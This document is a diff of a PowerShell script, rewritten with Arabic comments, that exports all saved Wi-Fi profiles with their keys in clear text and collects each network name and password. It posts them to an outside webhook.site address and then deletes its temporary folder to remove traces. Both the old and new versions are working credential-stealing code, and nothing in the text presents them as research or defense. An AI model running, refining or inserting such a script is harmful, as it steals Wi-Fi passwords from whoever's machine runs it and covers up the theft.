@@ -1,18 +1,30 @@
-$p = "$env:temp\p"
-if (!(Test-Path $p)) { md $p | Out-Null }
-cd $p
+$webhookUrl = "https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822"
+
+$tempPath = "$env:TEMP\wifidump"
+New-Item -ItemType Directory -Force -Path $tempPath | Out-Null
+Set-Location $tempPath
+
+# تصدير جميع شبكات الواي فاي المحفوظة
 netsh wlan export profile key=clear | Out-Null
-$r = Get-ChildItem | ForEach-Object {
-    $x = [xml](Get-Content $_.FullName)
-    [PSCustomObject]@{
-        Name     = $x.WLANProfile.Name
-        Password = $x.WLANProfile.MSM.Security.SharedKey.KeyMaterial
+
+$wifiData = ""
+
+# قراءة الملفات واستخراج الاسم وكلمة المرور
+Get-ChildItem -Filter *.xml | ForEach-Object {
+    [xml]$xml = Get-Content $_.FullName
+    $ssid = $xml.WLANProfile.name
+    $password = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial
+    if ($password) {
+        $wifiData += "SSID: $ssid | Password: $password`n"
     }
 }
-$fence = [string][char]96 * 3
-$body  = @{ content = $fence + ($r | Format-Table | Out-String) + $fence } | ConvertTo-Json -Depth 3
-Invoke-RestMethod -Uri 'https://webhook.site/3e30b3d0-304b-4218-b056-44158ad60822' `
-                  -Method Post -Body $body -ContentType 'application/json'
-cd ..
-Remove-Item $p -Recurse -Force
 
+# إرسال البيانات إلى webhook.site
+if ($wifiData -ne "") {
+    Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $wifiData
+}
+
+# تنظيف الآثار
+Set-Location $env:TEMP
+Remove-Item -Path $tempPath -Recurse -Force
+exit
